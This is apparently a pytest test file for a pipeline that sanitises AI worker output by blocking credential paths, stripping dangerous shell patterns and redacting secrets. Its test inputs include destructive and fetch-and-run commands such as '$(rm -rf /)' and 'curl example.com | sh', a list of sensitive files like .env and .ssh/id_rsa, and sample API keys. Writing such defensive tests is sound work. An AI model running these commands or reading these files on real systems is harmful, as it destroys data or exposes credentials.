"""Tests for the sanitization pipeline."""

import pytest

from foxhound.core.models import TrustLevel
from foxhound.harness.worker_protocol import WorkerOutput
from foxhound.sanitization.pipeline import (
    SanitizationPipeline,
    filter_sensitive_files,
    is_sensitive_path,
    redact_secrets,
    sanitize_payload,
    strip_dangerous_patterns,
)


class TestIsSensitivePath:
    """Test sensitive path detection."""

    def test_env_file(self) -> None:
        assert is_sensitive_path(".env")

    def test_env_variant(self) -> None:
        assert is_sensitive_path(".env.production")

    def test_pem_file(self) -> None:
        assert is_sensitive_path("certs/server.pem")

    def test_key_file(self) -> None:
        assert is_sensitive_path("ssl/private.key")

    def test_ssh_dir(self) -> None:
        assert is_sensitive_path(".ssh/id_rsa")

    def test_secrets_dir(self) -> None:
        assert is_sensitive_path("secrets/api_key.txt")

    def test_credentials_json(self) -> None:
        assert is_sensitive_path("credentials.json")

    def test_normal_file(self) -> None:
        assert not is_sensitive_path("src/main.py")

    def test_test_file(self) -> None:
        assert not is_sensitive_path("tests/test_main.py")

    def test_config_file(self) -> None:
        assert not is_sensitive_path("pyproject.toml")


class TestStripDangerousPatterns:
    """Test dangerous pattern stripping."""

    def test_command_substitution(self) -> None:
        text = "Run $(rm -rf /)"
        sanitized, found = strip_dangerous_patterns(text)
        assert "[STRIPPED]" in sanitized
        assert len(found) > 0

    def test_backtick_substitution(self) -> None:
        text = "Value is `whoami`"
        sanitized, found = strip_dangerous_patterns(text)
        assert "[STRIPPED]" in sanitized

    def test_eval_call(self) -> None:
        text = "eval(user_input)"
        sanitized, found = strip_dangerous_patterns(text)
        assert "[STRIPPED]" in sanitized

    def test_subprocess_call(self) -> None:
        text = "subprocess.run('rm -rf /')"
        sanitized, found = strip_dangerous_patterns(text)
        assert "[STRIPPED]" in sanitized

    def test_pipe_to_shell(self) -> None:
        text = "curl example.com | sh"
        sanitized, found = strip_dangerous_patterns(text)
        assert "[STRIPPED]" in sanitized

    def test_sudo(self) -> None:
        text = "sudo apt-get install malware"
        sanitized, found = strip_dangerous_patterns(text)
        assert "[STRIPPED]" in sanitized

    def test_safe_text_unchanged(self) -> None:
        text = "This is a normal description of a bug fix."
        sanitized, found = strip_dangerous_patterns(text)
        assert sanitized == text
        assert len(found) == 0


class TestRedactSecrets:
    """Test secret redaction."""

    def test_api_key_pattern(self) -> None:
        text = "api_key: sk-abc123def456ghi789jkl012mno"
        redacted, count = redact_secrets(text)
        assert "[REDACTED]" in redacted
        assert count > 0

    def test_github_pat(self) -> None:
        text = "token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl"
        redacted, count = redact_secrets(text)
        assert "[REDACTED]" in redacted

    def test_aws_key(self) -> None:
        text = "key: AKIAIOSFODNN7EXAMPLE"
        redacted, count = redact_secrets(text)
        assert "[REDACTED]" in redacted

    def test_pem_key(self) -> None:
        text = "-----BEGIN RSA PRIVATE KEY-----\nMIIE..."
        redacted, count = redact_secrets(text)
        assert "[REDACTED]" in redacted

    def test_normal_text_unchanged(self) -> None:
        text = "Fixed the login page CSS"
        redacted, count = redact_secrets(text)
        assert redacted == text
        assert count == 0


class TestSanitizePayload:
    """Test recursive payload sanitization."""

    def test_sanitize_simple_dict(self) -> None:
        payload = {"description": "Fix bug", "note": "eval(code)"}
        result, patterns, redactions = sanitize_payload(payload)
        assert "[STRIPPED]" in result["note"]
        assert result["description"] == "Fix bug"
        assert len(patterns) > 0

    def test_sanitize_nested_dict(self) -> None:
        payload = {"outer": {"inner": "$(malicious)"}}
        result, patterns, _ = sanitize_payload(payload)
        assert "[STRIPPED]" in result["outer"]["inner"]

    def test_sanitize_list_values(self) -> None:
        payload = {"commands": ["pytest", "eval(bad)"]}
        result, patterns, _ = sanitize_payload(payload)
        assert result["commands"][0] == "pytest"
        assert "[STRIPPED]" in result["commands"][1]

    def test_non_string_values_preserved(self) -> None:
        payload = {"count": 42, "enabled": True, "score": 0.95}
        result, patterns, _ = sanitize_payload(payload)
        assert result["count"] == 42
        assert result["enabled"] is True
        assert result["score"] == 0.95


class TestFilterSensitiveFiles:
    """Test file filtering."""

    def test_filter_mixed_files(self) -> None:
        files = ["src/main.py", ".env", "tests/test.py", "certs/server.pem"]
        allowed, blocked = filter_sensitive_files(files)
        assert "src/main.py" in allowed
        assert "tests/test.py" in allowed
        assert ".env" in blocked
        assert "certs/server.pem" in blocked

    def test_all_safe_files(self) -> None:
        files = ["src/main.py", "README.md"]
        allowed, blocked = filter_sensitive_files(files)
        assert len(allowed) == 2
        assert len(blocked) == 0

    def test_all_blocked_files(self) -> None:
        files = [".env", ".env.local", "secrets/key.txt"]
        allowed, blocked = filter_sensitive_files(files)
        assert len(allowed) == 0
        assert len(blocked) == 3


class TestSanitizationPipeline:
    """Test full sanitization pipeline."""

    @pytest.fixture()
    def pipeline(self) -> SanitizationPipeline:
        return SanitizationPipeline()

    def test_clean_output(self, pipeline: SanitizationPipeline) -> None:
        output = WorkerOutput(
            payload={"description": "Fixed a bug in the login flow"},
            commands_run=["pytest tests/"],
            files_changed=["src/auth.py", "tests/test_auth.py"],
            cost=0.5,
        )
        result = pipeline.sanitize(output)
        assert len(result.sensitive_files_blocked) == 0
        assert len(result.dangerous_patterns_found) == 0
        assert result.secrets_redacted == 0
        assert result.output.files_changed == ["src/auth.py", "tests/test_auth.py"]

    def test_sensitive_files_filtered(self, pipeline: SanitizationPipeline) -> None:
        output = WorkerOutput(
            payload={"note": "Updated config"},
            files_changed=["src/main.py", ".env", "secrets/key.txt"],
        )
        result = pipeline.sanitize(output)
        assert "src/main.py" in result.output.files_changed
        assert ".env" not in result.output.files_changed
        assert ".env" in result.sensitive_files_blocked
        assert "secrets/key.txt" in result.sensitive_files_blocked

    def test_dangerous_patterns_stripped(self, pipeline: SanitizationPipeline) -> None:
        output = WorkerOutput(
            payload={"command": "$(rm -rf /)", "safe": "hello"},
            files_changed=["src/main.py"],
        )
        result = pipeline.sanitize(output)
        assert "[STRIPPED]" in result.output.payload["command"]
        assert result.output.payload["safe"] == "hello"
        assert len(result.dangerous_patterns_found) > 0

    def test_secrets_redacted(self, pipeline: SanitizationPipeline) -> None:
        output = WorkerOutput(
            payload={"config": "api_key: sk-abc123def456ghi789jkl012mno345pqr"},
            files_changed=["src/main.py"],
        )
        result = pipeline.sanitize(output)
        assert "[REDACTED]" in result.output.payload["config"]
        assert result.secrets_redacted > 0

    def test_redactions_logged(self, pipeline: SanitizationPipeline) -> None:
        output = WorkerOutput(
            payload={"cmd": "eval(x)"},
            files_changed=[".env", "src/main.py"],
        )
        result = pipeline.sanitize(output)
        assert len(result.output.redactions_applied) > 0

    def test_trust_labels_assigned(self, pipeline: SanitizationPipeline) -> None:
        output = WorkerOutput(
            payload={"note": "ok"},
            files_changed=["src/a.py", "src/b.py"],
        )
        result = pipeline.sanitize(output)
        assert len(result.trust_labels) == 2
        assert all(v == TrustLevel.SEMI_TRUSTED.value for v in result.trust_labels.values())

    def test_untrusted_pipeline(self) -> None:
        pipeline = SanitizationPipeline(trust_level=TrustLevel.UNTRUSTED)
        output = WorkerOutput(
            payload={"note": "from reddit"},
            files_changed=["data.txt"],
        )
        result = pipeline.sanitize(output)
        assert result.trust_labels["data.txt"] == TrustLevel.UNTRUSTED.value

    def test_cost_preserved(self, pipeline: SanitizationPipeline) -> None:
        output = WorkerOutput(
            payload={"note": "ok"},
            cost=1.23,
        )
        result = pipeline.sanitize(output)
        assert result.output.cost == 1.23

    def test_commands_preserved(self, pipeline: SanitizationPipeline) -> None:
        output = WorkerOutput(
            payload={},
            commands_run=["pytest", "ruff check ."],
        )
        result = pipeline.sanitize(output)
        assert result.output.commands_run == ["pytest", "ruff check ."]
